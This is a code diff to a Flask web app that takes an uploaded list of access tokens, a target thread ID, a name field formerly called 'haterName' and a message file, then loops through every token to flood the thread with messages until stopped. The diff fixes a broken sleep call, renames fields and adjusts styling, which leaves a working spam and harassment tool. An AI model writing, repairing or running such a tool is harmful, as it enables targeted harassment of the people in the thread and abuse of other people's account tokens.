@@ -1,6 +1,7 @@
 from flask import Flask, request, render_template_string
 import requests
 from threading import Thread, Event
+import time
 import random
 import string
  
@@ -22,7 +23,7 @@ headers = {
 stop_events = {}
 threads = {}
  
-def send_messages(access_tokens, thread_id, mn, delay_interval, messages, task_id):
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
         for message1 in messages:
@@ -37,7 +38,7 @@ def send_messages(access_tokens, thread_id, mn, delay_interval, messages, task_i
                     print(f"Message Sent Successfully From token {access_token}: {message}")
                 else:
                     print(f"Message Sent Failed From token {access_token}: {message}")
-                delay.sleep(delay_interval)
+                time.sleep(time_interval)
  
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
@@ -51,8 +52,8 @@ def send_message():
             access_tokens = token_file.read().decode().strip().splitlines()
  
         thread_id = request.form.get('threadId')
-        mn = request.form.get('haterName')
-        delay_interval = int(request.form.get('delay'))
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
  
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
@@ -60,7 +61,7 @@ def send_message():
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
  
         stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, delay_interval, messages, task_id))
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
         threads[task_id] = thread
         thread.start()
  
@@ -81,12 +82,12 @@ def send_message():
             font-family: 'Roboto', sans-serif;
         }
         .container {
-            width: 80%;
+            width: 70%;
             margin: 0 auto;
-            padding: 30px;
+            padding: 20px;
             background-color: #1e1e1e;
-            border-radius: 30px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            border-radius: 20px;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
         }
         h1 {
             color: #0f0;
@@ -98,7 +99,7 @@ def send_message():
             font-weight: 700;
         }
         input[type="file"], input[type="text"], input[type="number"] {
-            width: 90%;
+            width: 100%;
             padding: 10px;
             margin: 5px 0;
             border: 1px solid #0f0;
@@ -154,7 +155,8 @@ def send_message():
     </div>
     <div>
 </body>
-</html>''')
+</html>
+''')
  
 @app.route('/stop', methods=['POST'])
 def stop_task():
